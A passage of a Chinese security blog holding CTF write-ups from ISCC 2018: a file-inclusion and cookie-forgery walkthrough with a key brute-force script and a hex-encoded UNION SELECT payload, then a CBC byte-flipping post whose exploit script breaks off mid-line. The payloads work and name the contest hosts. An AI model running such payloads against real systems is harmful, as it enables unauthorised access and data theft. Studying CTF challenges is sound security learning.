<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>sql注入中的基操还是太多了，学不完学不完…….不过还是该学的得学，紧跟着大佬的步伐。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjjiw7djt000laovef65xmcy3" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-入侵后台的一次尝试" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/17/入侵后台的一次尝试/" class="article-date">
  <time class="post-time" datetime="2018-05-17T06:18:27.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">17</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/17/入侵后台的一次尝试/">入侵后台的一次尝试</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近的ISCC放出了一道web400的题目，里面的代码审计真的是令人头疼，所以为了做出这道题目，我又跑去塔主那里学习了一波(其实之前打卡太懒了，没有认真去学习东西)。   </p>
<h2 id="一次看了解析的入侵后台的操作"><a href="#一次看了解析的入侵后台的操作" class="headerlink" title="一次看了解析的入侵后台的操作"></a>一次看了解析的入侵后台的操作</h2><p>先贴上网址吧。<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login</a>  </p>
<h3 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h3><p><img src="../images/12/1.png" alt=""><br>打开网站，发现可以攻击的点有很多，比如我们可以在登入框尝试sql注入攻击或者sql约束攻击，也可以尝试去进行xss和CSRF攻击，不过这只是一道CTF题目，管理员不太可能会从登入框登入，所以CSRF攻击可以考虑先放一边。<br><img src="../images/12/2.png" alt=""><br>这里是值得注意的一个点，当我们看到形如这种<strong>?action=front&amp;mode=login</strong>是可以去考虑文件包含漏洞的，一般看到这种，就可以大胆猜测后台是通过<strong>file=$action.’/‘.$mode.’.php’</strong>这种类型的代码来读取文件的。  </p>
<h3 id="进一步探索"><a href="#进一步探索" class="headerlink" title="进一步探索"></a>进一步探索</h3><p>之前都是考虑的一些点，不过还是先按照作者的思路走，既然有一个注册账号的界面，那我们先注册登入看看。<br><img src="../images/12/3.png" alt=""><br>登入进去发现了一条笔记，笔记内容大致是说只有管理员才可以删除笔记，末尾还有一个hint，我们打开这个<strong>./dbinit.sql</strong>，发现弹出一个下载界面，既然是提示，那就下下来看下吧。<br><img src="../images/12/4.png" alt=""><br>这里提供了一个很有用的信息就是数据库里面有一个flag表，我们从里面应该就能得到我们所要的flag了，所以这里肯定会涉及到sql注入的地方，不过，在哪里注入是一个未知的问题。<br>随后我还点了点新建笔记，删除笔记的时候提示我只能是admin才能操作。  </p>
<h3 id="LEF漏洞读取文件"><a href="#LEF漏洞读取文件" class="headerlink" title="LEF漏洞读取文件"></a>LEF漏洞读取文件</h3><p>没啥可以利用的东西了，我们可以试试之前考虑过的文件包含漏洞，构造</p>
<blockquote>
<p>?action=php://filter/read=convert.base64-encode/resource=./&amp;mode=index  </p>
</blockquote>
<p>成功读取了文件，base64解码得到了index.php的内容。接下来就好办多了，把已知文件名的内容全部读取出来。用扫描器扫了扫，发现了其他的一些文件。<br><img src="../images/12/5.png" alt=""><br>全部把源码读取出来  </p>
<h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><p>先来总结一下我们所得到的几个文件的源码:<br>index.php<br>common.php<br>admin/login.php<br>admin/index.php<br>还有一些其他的源码不太重要我就不列举了。<br>首先看看index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function d_addslashes($array)&#123;</span><br><span class="line"></span><br><span class="line">    foreach($array as $key=&gt;$value)&#123;</span><br><span class="line">        if(!is_array($value))&#123;</span><br><span class="line">              !get_magic_quotes_gpc()&amp;&amp;$value=addslashes($value);</span><br><span class="line">              $array[$key]=$value;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line"></span><br><span class="line">          $array[$key] = d_addslashes($array[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $array;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST=d_addslashes($_POST);</span><br><span class="line">$_GET=d_addslashes($_GET);</span><br></pre></td></tr></table></figure></p>
<p>可以看到这里使用了转义’来防止我们使用sql注入，那这样一般来说sql注入是行不通的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include_once(&apos;common.php&apos;);</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&apos;action&apos;])||!isset($_GET[&apos;mode&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    header(&quot;Location: ./index.php?action=front&amp;mode=login&quot;);</span><br><span class="line"></span><br><span class="line">&#125;elseif(!preg_match(&apos;/\.&#123;2&#125;/is&apos;,$_GET[&apos;action&apos;])&amp;&amp;preg_match(&apos;/^[0-9A-Za-z]+$/is&apos;,$_GET[&apos;mode&apos;]))&#123;</span><br><span class="line">    $action=$_GET[&apos;action&apos;];</span><br><span class="line">    $mode=$_GET[&apos;mode&apos;];</span><br><span class="line">    $file=$action.&apos;/&apos;.$mode.&apos;.php&apos;;</span><br><span class="line">    </span><br><span class="line">    // echo $file;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">    die(&quot;Invalid Request!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>和我们之前猜想的一致，动态链接果然是通过<strong>$file=$action.’/‘.$mode.’.php’;</strong>来读取我们所要的文件的。此后遇到这种情况一般都可以这样考虑，不过有些题目如果过滤了，那再去考虑如何绕过过滤。<br>index.php应该是没有什么可值得审计的了，接下来该审计的地方就是admin/login.php这个点了,common.php里面的配置我们在需要的时候再去看。<br>这是admin/login.php的一些主要内容<br><img src="../images/12/6.png" alt=""><br>简单分析以下就是，首先判断用户输入的用户名和密码是否有效，这里用到了CSRFTOKEN来判断，然后再去数据库中查询我们所输入的用户名和密码是否正确，其实这里是可以尝试注入攻击的，但是我们所要的数据不在这里，所以也没有攻击的必要。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function set_login($uname,$id,$level)&#123;</span><br><span class="line">     $_SESSION[&apos;userid&apos;]=$id;</span><br><span class="line">     $_SESSION[&apos;level&apos;]=$level;</span><br><span class="line">     </span><br><span class="line">     $endata=encode($uname);</span><br><span class="line">     setcookie(&quot;uid&quot;,&quot;$uname|$endata&quot;);</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这是set_login函数，它把id和level赋给了两个session中的值，然后值得注意的是它把<strong>uname|</strong>和encode加密后的uname拼接在了一起作为uid，并且把它设为了cookies，可以看到这里虽然进行了登入验证，但是它在跳转到admin/index.php的时候，身份验证是通过cookies来验证的，所以这里我们可以通过构造cookies来绕过admin/login.php直接登入admin/index.php。<br>接下来看看admin/index.php<br><img src="../images/12/7.png" alt=""><br>看看验证登入的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line"></span><br><span class="line">    $uid=$_COOKIE[&apos;uid&apos;];</span><br><span class="line">    $userinfo=explode(&quot;|&quot;,$uid);</span><br><span class="line"></span><br><span class="line">    if($userinfo[0]&amp;&amp;$userinfo[1]&amp;&amp;$userinfo[1]==encode($userinfo[0]))&#123;</span><br><span class="line">        return $_SESSION[&apos;userid&apos;];</span><br><span class="line"></span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        return FALSE;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>只是把uid还原了而已，所以我们是可以通过构造uid来实现绕过的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function get_level()&#123;</span><br><span class="line"></span><br><span class="line">    $uid=$_COOKIE[&apos;uid&apos;];</span><br><span class="line">    $userinfo=explode(&quot;|&quot;,$uid);</span><br><span class="line"></span><br><span class="line">    if($userinfo[0]&amp;&amp;$userinfo[1]&amp;&amp;$userinfo[1]==encode($userinfo[0]))&#123;</span><br><span class="line">        </span><br><span class="line">        if($_SESSION[&apos;level&apos;]!==&quot;0&quot;)&#123;</span><br><span class="line"></span><br><span class="line">            return $_SESSION[&apos;level&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return FALSE;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>level由于一开始我们登入就默认赋值为了1，所以是没必要去构造level的。接下来可以试着去攻击了。  </p>
<h3 id="构造cookies绕过"><a href="#构造cookies绕过" class="headerlink" title="构造cookies绕过"></a>构造cookies绕过</h3><p>先来看看encode是如何加密的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function rand_str($lenth=16)&#123;</span><br><span class="line">   $rand=[];</span><br><span class="line">   $_str=&quot;wh&quot;;</span><br><span class="line">   while($lenth)&#123;</span><br><span class="line">   $rand[]=$_str[rand(0,strlen($_str)-1)];</span><br><span class="line">   $lenth--;</span><br><span class="line">   &#125;</span><br><span class="line">//    var_dump($rand);     </span><br><span class="line">    return implode($rand);</span><br><span class="line">&#125;    </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&apos;SECURITY_KEY&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    $_SESSION[&apos;SECURITY_KEY&apos;]=rand_str(6);</span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function encode($str)&#123;</span><br><span class="line">    return md5($_SESSION[&apos;SECURITY_KEY&apos;].$str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先是随机生成一个6位的key然后和username经过md5加密，这里有一个难点就是rand()函数随机从h和w取，这一般对我们来说是无法得到key的，但是rand()函数其实是可预测的，它是一个伪随机函数生成器，原理就不多说了。详细参考这篇文章:<a href="http://www.freebuf.com/articles/web/99093.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/99093.html</a><br>要预测就必须要有经过rand()函数生成的前33位数据，所以除了一开始的6位，哪里还有呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_SESSION[&apos;CSRF_TOKEN&apos;]))&#123;</span><br><span class="line">    $_SESSION[&apos;CSRF_TOKEN&apos;]=rand_str(16);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>还有TOKEN,所以我们可以通过两次访问来获取共计44位的数据，来预测下一次生成的key。直接贴塔主的脚本吧。不过塔主的脚本只是针对随机取的字符串只存在少数的情况下，通过爆破来实现的。  </p>
<pre><code>import requests
import re
import itertools
import random
import hmac
import hashlib
import sys
import string
rand = &apos;wh&apos;    //根据需要自行更改
get_token = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login&quot;
test_cookie = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=index&quot;

def get_csrf_token(res):
    rex = re.search(r&apos;\S*&lt;input type=&quot;hidden&quot; name=&quot;TOKEN&quot; id=&quot;password&quot; value=&quot;(\w*)&quot;&gt;&apos;, res.content)
    print rex.group(1)
    return rex.group(1)


def test_token(s,screat,phpsessionid):

 # _cookie=s.cookies
 # requests.utils.add_dict_to_cookiejar(_cookie,{&quot;uid&quot;:&quot;admin%7c&quot;+hash_hmac(screat)})

    s.headers[&apos;cookie&apos;]=&quot;&quot;
    s.headers[&apos;Cookie&apos;]=&quot;uid=admin%7c&quot;+hash_hmac(screat)+&quot;; &quot;+phpsessionid


    res=s.get(test_cookie)
    if res.content.find(&quot;not login&quot;)&lt;0:
        print &quot;key&quot;,screat
        print &quot;cookies&quot;,s.headers[&apos;Cookie&apos;]
        return True
    else:
        print &quot;key:&quot;,screat,&quot;failed!&quot;
        return False


def hash_hmac(data):
    hash=hashlib.md5()
    hash.update(data+&quot;admin&quot;)
    # h = hmac.new(key, data, hashlib.md5)
    return hash.hexdigest()

def rand_str(length):
    return &apos;&apos;.join(random.choice(string.letters + string.digits) for _ in range(length))

def calc_maybe(lst):
    prd = []
    for i in lst:
        prd.append((i, i+1))
    return itertools.product(*prd)


flag = True
while flag:
    rand_lst = []
    s = requests.session();
    s.headers = {
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) &quot;
                      &quot;AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51&quot;
                      &quot;.0.2704.63 Safari/537.36&quot;
    }


    s.headers[&apos;Cookie&apos;] = &quot;PHPSESSID={};&quot;.format(rand_str(26))
    phpsessionid=s.headers[&apos;Cookie&apos;]
    for i in range(2):
        for j in range(2):
            for k in range(2):
                for l in range(2):
                    for m in range(2):
                        for n in range(2):
                            secret = rand[i]+rand[j]+rand[k]+rand[l]+rand[m]+rand[n]
                            if test_token(s, secret, phpsessionid):
                                flag = False
                                break
                    if flag ==False:
                        break
                if flag == False:
                    break
            if flag == False:
                break
        if flag == False:
            break
    if flag == False:
        break
</code></pre><p><img src="../images/12/8.png" alt=""><br>现在我们得到了uid以及登入时验证的phpsessid,可以通过火狐插件来修改cookies，直接以admin身份登入。  </p>
<h3 id="获取我们所要的信息"><a href="#获取我们所要的信息" class="headerlink" title="获取我们所要的信息"></a>获取我们所要的信息</h3><p><img src="../images/12/9.png" alt=""><br>可以看到这里只有一个查询功能，点开。<br><img src="../images/12/10.png" alt=""><br>发现这里只有一个查询前多少条的功能。先利用LEF漏洞看看源码。<br><img src="../images/12/11.png" alt=""><br>这里有一个is_numeric()函数，我们只能输入数字，0e类型，还有十六进制。是无法输入字符串的。不过，仔细看看最初的sql文件。<br><img src="../images/12/12.png" alt=""><br>这里的num是字符串形式，也就是说，我们输入的hex值，是可以被当作字符来处理的。所以我们可以通过把我们的查询语句转为hex值然后进行查询。值得注意的是note是有四列的。<br><img src="../images/12/13.png" alt=""><br>语句如上，所以不用加’闭合，前面的条数一定要比数据库有的条数少，要不然会报错。所以查询语句为<strong>2 union select 1,flag,3,4 from flags</strong>。<br>经过处理变为<strong>0x3220756e696f6e2073656c65637420312c666c61672c332c342066726f6d20666c616773</strong><br>拼接起来就是<strong>select * from note limit 0,2 union select 1,flag,3,4 from flags</strong><br>接着提交就能查出flag了，如果不是题目那么我们是可以通过注入取拿shell了。</p>
<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>这一次的流程的确是有很多很多的坑，我归纳起来也用了将近3天RCTF日常爆零，安恒又不会打，ISCC新放出的题目也不会做，太垃圾了。欸。。。。。。。。。。。。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjjiw7dk80011aovejtnjvkep" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-CBC字节反转攻击" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/07/CBC字节反转攻击/" class="article-date">
  <time class="post-time" datetime="2018-05-07T08:59:19.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">07</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/07/CBC字节反转攻击/">CBC字节反转攻击</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在比赛中遇到了一道挺有意思的题目，密码学和web的结合让我学到了很多不错的知识，之前也有类似的题目，例如上次的Hash长度拓展攻击，这一次的是CBC字节反转攻击，和它有着异曲同工之妙。  </p>
<h2 id="CBC加解密原理"><a href="#CBC加解密原理" class="headerlink" title="CBC加解密原理"></a>CBC加解密原理</h2><p><img src="../images/11/1.png" alt=""><br>这是CBC模式加密的流程图，这种加密模式和Hash加密是相似的，<strong>都是前一部分加密的字符用于后一部分加密</strong>，具体流程是初始生成一个IV值，然后把字符按照16字节为一个单位进行分组(不足时用特殊字符填充)和IV值进行异或处理，得到的字符串使用密钥进行加密，然后把加密后的字符作为下一步的IV值，重复操作直到所有字符串加密完成。<br><img src="../images/11/2.png" alt=""><br>解密的过程就不多说了。  </p>
<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>异或操作(Xor)是对二进制数据进行的运算操作，是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。其运算法则为：<br>a⊕b = (¬a ∧ b) ∨ (a ∧¬b)<br>如果a、b两个值不相同，则异或结果为1。如果a、b两个值相同，异或结果为0。例如A=10010100，B=00100111。那么A Xor B =01001100。如果C = A Xor B ，那么A Xor B Xor C =0并且其中两个异或，都能得到第三者。</p>
<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p><img src="../images/11/3.png" alt=""><br>这是大手子原理利用的图，这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。基本的理论都讲完了，那么从题目中来理解如何利用的。<br><a href="http://118.190.152.202:8001/" target="_blank" rel="noopener">这是ISCC上的一道题目</a>，打开题目地址，有点类似注入的题目，但是f12过后发现题目给出了源码。打开index.txt发现源码。<br> 我们来理一理这些代码是如何执行的，首先是登入的代码<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">  $username=waf((string)$_POST[&apos;username&apos;]);</span><br><span class="line">  $password=waf((string)$_POST[&apos;password&apos;]);</span><br><span class="line">  if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>如果我们输入了username和password那么页面会先把username转化为字符串形式，这里是为了防止我们通过数组形式来绕过下面的<strong>username=admin</strong>，再waf过滤，这里我们的sql注入是不太可行的。如果我们输入的username为admin那么页面回显错误信息然后直接退出，不为admin那么接着调用了login()以及show_homepage()函数，如果我们通过其他方式给username赋值了，那么跳到check_login()和show_homepage()两个函数上。那我们接着来看这些函数。<br><strong>login()</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function login($info)&#123;</span><br><span class="line">    $iv=get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>show_homepage()</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>整体来说就是，先把我们输入进去的username和password序列化，然后把username的值赋给$_SESSION[“username”]，如果为admin，那么输出flag，如果不为admin，则提示只有admin才能看flag。<br>如果按照上述常规的操作进行登入，那肯定是不行的，这里有一个矛盾，如果我们传入username为admin那么会提示我们<strong>You are not real admin!</strong>，但是我们不传入admin，那么就会提示我们只用admin才能看flag。所以我们需要考虑如何来绕过。所以接着看另一条路的函数<br><strong>check_login</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里我们是在没有传入username和password之后所调用的，这里我们需要通过cookies传入一个iv值和一个cipher值，然后cipher经过各种解密，反序列化后把username赋给$_SESSION[‘username’]然后进行身份的验证。<br>分析了源码发现两种登入方式独立开来并没有什么可以利用的东西，但是如果我们把两种方式结合起来，在他们中间那段可进行人为操作的过程中更改数据，那么是可以做到移花接木的。  </p>
<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p><strong>1 传参抓包</strong><br>把username和password传参过去，注意username不能为admin。<br><img src="../images/11/4.png" alt=""><br><strong>2 更改数据</strong><br>我们这个时候得到了密文和初始的iv值，那么可以通过cbc反转字节攻击来更改我们之前的数据。那么如何利用CBC反转字节呢？<br>我们已知了加密后的文本，以及明文，那我们可以来修改原来的字符串。<br><strong>cipher</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gEc6%2BRRLjY0Bf51gQLMCB1a%2F9wD2106%2BeTzmU%2Baum9Xfin%2BlY%2FF9FfcoPd7%2Buls1Q9sOQJ4zfbnen6c5cxFLcQ%3D%3D</span><br></pre></td></tr></table></figure></p>
<p>进行处理后变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�G:�K���`@�V����N�y&lt;�S殛�ߊ�c�&#125;�(=���[5C�@�3&#125;�ޟ�9sKq</span><br></pre></td></tr></table></figure></p>
<p><strong>所对应的明文</strong><br>为了便于理解，我们直接以16字节为一块分开。这是反序列化后的明文。<br>s:2:{s:8:”userna<br>me”;s:5:”xdmin”;<br>s:8:”password”;s<br>:3:”123”;}<br>接下来就是把对应的位置进行更改。<br>假设我们更改的明文为A<br>IV值对应的是B<br>密文为C<br>如果我们构造 <strong>C Xor A Xor “我们所需的字符”</strong>，那是不是就变成了A Xor B Xor A Xor “我们所需的字符”了？这不就等于B Xor “我们所需的字符”了吗？所以我们可以直接利用这个攻击来更改我们的字符。这里直接用大手子的脚本跑把吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">iv_raw=&apos;bR1nkWOLhxJ4rKGJMBF36w%3D%3D&apos;  #这里填写第一次返回的iv值</span><br><span class="line">cipher_raw=&apos;gEc6%2BRRLjY0Bf51gQLMCB1a%2F9wD2106%2BeTzmU%2Baum9Xfin%2BlY%2FF9FfcoPd7%2Buls1Q9sOQJ4zfbnen6c5cxFLcQ%3D%3D&apos;  #这里填写第一次返回的cipher值</span><br><span class="line">print 